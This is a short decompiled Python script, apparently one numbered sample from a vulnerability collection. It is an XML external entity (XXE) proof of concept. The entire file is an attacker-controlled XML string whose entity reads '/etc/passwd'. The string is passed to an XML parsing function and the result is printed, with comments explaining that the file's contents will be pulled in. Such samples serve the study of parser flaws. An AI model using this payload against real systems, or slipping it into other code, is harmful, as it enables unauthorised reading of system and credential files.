# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 241_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 678 bytes
import easyxml

def parse_user_data(xml_input):
    user_data = easyxml.parseXML(xml_input)
    return user_data


attacker_xml = '<?xml version="1.0"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">  <!-- Attacker-controlled entity -->\n]>\n<user>\n  <name>&xxe;</name>  <!-- This will include the contents of /etc/passwd -->\n</user>\n'
try:
    user_info = parse_user_data(attacker_xml)
    print("User  Info:", user_info)
except Exception as e:
    try:
        print("An error occurred:", e)
    finally:
        e = None
        del e

# okay decompiling 241_1.pyc
